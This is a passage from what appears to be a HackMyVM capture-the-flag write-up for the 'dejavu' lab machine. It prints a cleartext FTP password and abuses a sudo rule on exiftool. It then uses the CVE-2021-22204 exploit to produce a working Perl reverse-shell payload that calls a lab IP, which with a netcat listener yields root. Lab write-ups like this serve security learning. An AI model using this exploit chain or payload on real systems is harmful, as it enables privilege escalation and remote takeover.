4 drwxr-xr-x 3 root   root   4096 May 12  2022 ../
4 -r-x------ 1 robert robert   72 May 13  2022 auth.sh
0 lrwxrwxrwx 1 robert robert    9 May 13  2022 .bash_history -> /dev/null
4 -rw-r--r-- 1 robert robert  220 Feb 25  2020 .bash_logout
4 -rw-r--r-- 1 robert robert 3771 Feb 25  2020 .bashrc
4 drwx------ 2 robert robert 4096 May 12  2022 .cache/
4 drwxrwxr-x 3 robert robert 4096 May 13  2022 .local/
4 -rw-r--r-- 1 robert robert  807 Feb 25  2020 .profile
4 -rw-rw-r-- 1 robert robert   66 May 13  2022 .selected_editor
4 drwx------ 2 robert robert 4096 May 12  2022 .ssh/
0 -rw-r--r-- 1 robert robert    0 May 12  2022 .sudo_as_admin_successful
4 -r-------- 1 robert robert   38 May 13  2022 user.txt ←
4 -rw-rw-r-- 1 robert robert  215 May 13  2022 .wget-hsts
```

`cat ./user.txt`:
```
HMV{c8b75037150fbdc49f6c941b72db0d7c} ←
```

`cat ./auth.sh`:
```
cat auth.sh
ftp -n localhost <<FIN
quote USER robert
quote PASS 9737bo0hFx4
bye
FIN
```

`sudo -l`:
```
Matching Defaults entries for robert on dejavu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on dejavu:
    (root) NOPASSWD: /usr/local/bin/exiftool ←
```

`exiftool -ver`:
```
12.23 ←
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`searchsploit exiftool`:
```              
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
ExifTool 12.23 - Arbitrary Code Execution                 | linux/local/50911.py ←
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

`cp /usr/share/exploitdb/exploits/linux/local/50911.py ./`

`cat ./50911.py`:
```python
# Exploit Title: ExifTool 12.23 - Arbitrary Code Execution
# Date: 04/30/2022
# Exploit Author: UNICORD (NicPWNs & Dev-Yeoj)
# Vendor Homepage: https://exiftool.org/
# Software Link: https://github.com/exiftool/exiftool/archive/refs/tags/12.23.zip
# Version: 7.44-12.23
# Tested on: ExifTool 12.23 (Debian)
# CVE: CVE-2021-22204
# Source: https://github.com/UNICORDev/exploit-CVE-2021-22204
# Description: Improper neutralization of user data in the DjVu file format in ExifTool versions 7.44 and up allows arbitrary code execution when parsing the malicious image

[...]

Usage:
  python3 exploit-CVE-2021-22204.py -c <command>
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port>
  python3 exploit-CVE-2021-22204.py -c <command> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -s <local-IP> <local-port> [-i <image.jpg>]
  python3 exploit-CVE-2021-22204.py -h

Options:
  -c    Custom command mode. Provide command to execute.
  -s    Reverse shell mode. Provide local IP and port.
  -i    Path to custom JPEG image. (Optional)
  -h    Show this help menu.

[...]       
```

`scp ./50911.py robert@192.168.56.112:/home/robert`:
```
robert@192.168.56.112's password: ←
50911.py                               100% 4740     2.5MB/s   00:00 ←
```

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>

`python3 ./50911.py -s 192.168.56.101 6666`:
```
RUNNING: UNICORD Exploit for CVE-2021-22204
PAYLOAD: (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(6666,inet_aton('192.168.56.101')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};")                                                  
RUNTIME: DONE - Exploit image written to 'image.jpg' ←
```

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

`nc -lvnp 6666`:
```                                                                    
listening on [any] 6666 ... ←
```

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>robert</code> }</b></span>

`sudo /usr/local/bin/exiftool image.jpg`

<span style="color: #e57373;"><b>Attacker { os: kali linux }</b></span>

```
connect to [192.168.56.101] from (UNKNOWN) [192.168.56.112] 58808 ←
/bin/sh: 0: can't access tty; job control turned off
```

<span style="color: #64b5f6;"><b>Victim { os: ubuntu linux, user: <code>root</code> }</b></span>

`whoami`:
```
root ←
```

`cd /root/`

`cat r0ot.tXt`:
```
HMV{c62d75d636f66450980dca2c4a3457d8} ←
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
